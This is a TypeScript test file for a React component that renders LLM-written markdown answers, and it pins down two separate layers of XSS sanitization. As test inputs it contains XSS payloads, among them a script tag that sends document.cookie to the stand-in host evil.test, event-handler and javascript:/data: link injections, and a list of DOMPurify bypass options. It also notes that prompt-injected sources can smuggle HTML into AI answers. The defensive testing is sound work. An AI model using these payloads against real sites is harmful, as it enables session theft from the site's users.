import { afterEach, describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import DOMPurify from "dompurify";
import { AnswerMarkdown } from "./markdown";

const noop = () => undefined;

afterEach(() => {
  vi.restoreAllMocks();
});

/** Every attribute name appearing anywhere in the rendered tree. */
function renderedAttributeNames(container: HTMLElement): string[] {
  return Array.from(container.querySelectorAll("*")).flatMap((el) =>
    Array.from(el.attributes).map((a) => a.name.toLowerCase()),
  );
}

describe("AnswerMarkdown", () => {
  it("renders markdown structure (headings, lists, emphasis, inline code)", () => {
    const { container } = render(
      <AnswerMarkdown
        text={"## Retrieval\n\nThe **hybrid** path uses `cosine` scores.\n\n- one\n- two"}
        onCite={noop}
      />,
    );
    expect(container.querySelector("h2")?.textContent).toBe("Retrieval");
    expect(container.querySelector("strong")?.textContent).toBe("hybrid");
    expect(container.querySelector("code")?.textContent).toBe("cosine");
    expect(Array.from(container.querySelectorAll("li")).map((li) => li.textContent)).toEqual([
      "one",
      "two",
    ]);
  });

  it("turns [E#] tokens into citation chips that call onCite", () => {
    const onCite = vi.fn();
    render(<AnswerMarkdown text="The parser changed [E2] to fix drift [E11]." onCite={onCite} />);
    const chips = screen.getAllByRole("button");
    expect(chips.map((c) => c.textContent)).toEqual(["E2", "E11"]);
    expect(chips.every((c) => c.className === "cite")).toBe(true);
    fireEvent.click(chips[0]);
    expect(onCite).toHaveBeenCalledWith("E2");
    fireEvent.click(chips[1]);
    expect(onCite).toHaveBeenCalledWith("E11");
  });

  it("keeps citation chips working inside markdown formatting", () => {
    const onCite = vi.fn();
    const { container } = render(
      <AnswerMarkdown text={"- **bold claim** [E3]\n- plain claim [E4]"} onCite={onCite} />,
    );
    const chips = screen.getAllByRole("button");
    expect(chips.map((c) => c.textContent)).toEqual(["E3", "E4"]);
    // The first chip lives inside the first list item, after the <strong>.
    expect(container.querySelectorAll("li")[0]?.contains(chips[0])).toBe(true);
    fireEvent.click(chips[0]);
    expect(onCite).toHaveBeenCalledWith("E3");
  });

  it("does not turn [E#] inside code into chips", () => {
    const { container } = render(
      <AnswerMarkdown
        text={"Use `arr[E1]` here.\n\n```\nconst x = arr[E2];\n```"}
        onCite={noop}
      />,
    );
    expect(screen.queryByRole("button")).toBeNull();
    expect(container.querySelector("code")?.textContent).toBe("arr[E1]");
    expect(container.querySelector("pre code")?.textContent).toContain("arr[E2]");
  });

  it("strips raw HTML from the answer (script, event handlers, unknown tags)", () => {
    const { container } = render(
      <AnswerMarkdown
        text={'Before <script>window.x = 1</script><img src="x" onerror="window.x=2"> <iframe src="https://example.com"></iframe> after'}
        onCite={noop}
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.textContent).toContain("Before");
    expect(container.textContent).toContain("after");
  });

  it("unwraps non-http(s) links to plain text", () => {
    const { container } = render(
      <AnswerMarkdown text={"a [bad](javascript:alert(1)) link"} onCite={noop} />,
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("bad");
  });

  it("renders http(s) links with a safe target/rel", () => {
    const { container } = render(
      <AnswerMarkdown text={"see [the docs](https://example.com/docs)"} onCite={noop} />,
    );
    const a = container.querySelector("a");
    expect(a?.getAttribute("href")).toBe("https://example.com/docs");
    expect(a?.getAttribute("target")).toBe("_blank");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("renders GFM tables", () => {
    const { container } = render(
      <AnswerMarkdown
        text={"| metric | value |\n| --- | --- |\n| recall | 0.93 |"}
        onCite={noop}
      />,
    );
    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelector("th")?.textContent).toBe("metric");
    expect(container.querySelector("td")?.textContent).toBe("recall");
  });

  it("tolerates incomplete markdown mid-stream (unclosed fence, dangling emphasis)", () => {
    const { container } = render(
      <AnswerMarkdown text={"Partial **answer [E1]\n\n```py\nx ="} onCite={noop} />,
    );
    // No crash; the accumulated text still renders and the chip survives.
    expect(container.textContent).toContain("Partial");
    expect(screen.getAllByRole("button").map((c) => c.textContent)).toEqual(["E1"]);
  });
});

/**
 * The XSS boundary for LLM-synthesized answers, pinned deliberately.
 *
 * Answer text is untrusted: a poisoned note or a prompt-injected source can put
 * arbitrary HTML into it. Two independent layers stand between that text and the
 * DOM, and these tests hold each one on its own so that neither can quietly
 * become decorative:
 *
 *   1. DOMPurify, called with a minimal allowlist and no options that widen it.
 *   2. The DOM->React walker, which re-applies the tag allowlist and rebuilds
 *      element props from scratch instead of copying attributes across.
 */
describe("AnswerMarkdown sanitization boundary", () => {
  it("routes the answer through DOMPurify with a minimal, non-widened config", () => {
    const spy = vi.spyOn(DOMPurify, "sanitize");
    render(<AnswerMarkdown text={"**hi** <b>raw</b>"} onCite={noop} />);

    // Deleting the sanitize call fails here before any DOM assertion runs.
    expect(spy).toHaveBeenCalledTimes(1);
    const config = spy.mock.calls[0][1] as Record<string, unknown> | undefined;
    expect(config).toBeDefined();

    const tags = config?.ALLOWED_TAGS as string[];
    const attrs = config?.ALLOWED_ATTR as string[];
    expect(Array.isArray(tags)).toBe(true);
    expect(Array.isArray(attrs)).toBe(true);

    // Widening the allowlist to any script-bearing or resource-loading tag
    // reopens the hole this component exists to close.
    for (const forbidden of [
      "script", "iframe", "object", "embed", "img", "svg",
      "style", "form", "input", "math", "link", "meta", "base",
    ]) {
      expect(tags).not.toContain(forbidden);
    }
    // No event handlers, and no attribute that can name a URL to fetch or run.
    expect(attrs.filter((a) => a.toLowerCase().startsWith("on"))).toEqual([]);
    for (const forbidden of ["src", "srcset", "style", "formaction", "xlink:href"]) {
      expect(attrs).not.toContain(forbidden);
    }

    // The two options behind the published DOMPurify bypasses. IN_PLACE leaves a
    // detached-but-executable subtree; CUSTOM_ELEMENT_HANDLING lets custom
    // elements skip afterSanitizeElements. Neither belongs here.
    expect(config).not.toHaveProperty("IN_PLACE");
    expect(config).not.toHaveProperty("CUSTOM_ELEMENT_HANDLING");
    // Escape hatches that would re-admit what the allowlist just excluded.
    for (const key of ["ADD_TAGS", "ADD_ATTR", "ADD_URI_SAFE_ATTR", "WHOLE_DOCUMENT"]) {
      expect(config).not.toHaveProperty(key);
    }
  });

  it("never renders event-handler attributes on tags that survive sanitization", () => {
    const { container } = render(
      <AnswerMarkdown
        text={
          'A <p onclick="steal()">clickable</p> and ' +
          '<a href="https://example.com" onmouseover="steal()">a link</a>.'
        }
        onCite={noop}
      />,
    );
    // The allowed tags and their legitimate attribute survive.
    expect(container.textContent).toContain("clickable");
    expect(container.querySelector("a")?.getAttribute("href")).toBe("https://example.com");
    // Nothing anywhere in the tree carries an on* handler.
    expect(renderedAttributeNames(container).filter((n) => n.startsWith("on"))).toEqual([]);
  });

  it("drops the source text of script payloads, not just the element", () => {
    const { container } = render(
      <AnswerMarkdown
        text={"Start <script>fetch('https://evil.test/'+document.cookie)</script> end"}
        onCite={noop}
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    // A stripped <script> whose body leaks into a text node is still an
    // information leak on screen, and one reparse away from executing.
    expect(container.textContent).not.toContain("document.cookie");
    expect(container.textContent).not.toContain("evil.test");
    expect(container.textContent).toContain("Start");
    expect(container.textContent).toContain("end");
  });

  it("treats link hrefs as an http(s) allowlist, not a javascript: denylist", () => {
    const { container } = render(
      <AnswerMarkdown
        text={
          "[upper](JaVaScRiPt:alert(1)) " +
          "[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) " +
          "[vb](vbscript:msgbox(1)) " +
          "[ok](https://example.com/safe)"
        }
        onCite={noop}
      />,
    );
    const hrefs = Array.from(container.querySelectorAll("a")).map((a) => a.getAttribute("href"));
    // Only the http(s) link is still an anchor; the rest unwrap to plain text.
    expect(hrefs).toEqual(["https://example.com/safe"]);
    expect(container.textContent).toContain("upper");
  });

  it("holds the line in the DOM->React walker when the sanitizer lets HTML through", () => {
    // Simulates a DOMPurify regression, a bypass, or a future config change that
    // widens what reaches the walker. Layer 2 must stand on its own; if it is
    // ever reduced to a comment that says "DOMPurify already did this", this
    // fails.
    const passthrough = vi
      .spyOn(DOMPurify, "sanitize")
      .mockImplementation(((dirty: string) => dirty) as typeof DOMPurify.sanitize);

    const { container } = render(
      <AnswerMarkdown
        text={
          'Before <script>window.pwned = 1</script>' +
          '<img src="x" onerror="window.pwned = 2">' +
          '<iframe src="https://evil.test"></iframe>' +
          '<a href="javascript:alert(1)">click</a>' +
          '<p onclick="window.pwned = 3">tail</p> after'
        }
        onCite={noop}
      />,
    );

    expect(passthrough).toHaveBeenCalled();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(renderedAttributeNames(container).filter((n) => n.startsWith("on"))).toEqual([]);
    expect(container.textContent).not.toContain("window.pwned");
    expect(container.textContent).not.toContain("evil.test");
    // Benign surrounding prose still renders, so the walker drops the payload
    // rather than the whole answer.
    expect(container.textContent).toContain("Before");
    expect(container.textContent).toContain("tail");
    expect(container.textContent).toContain("after");
  });
});
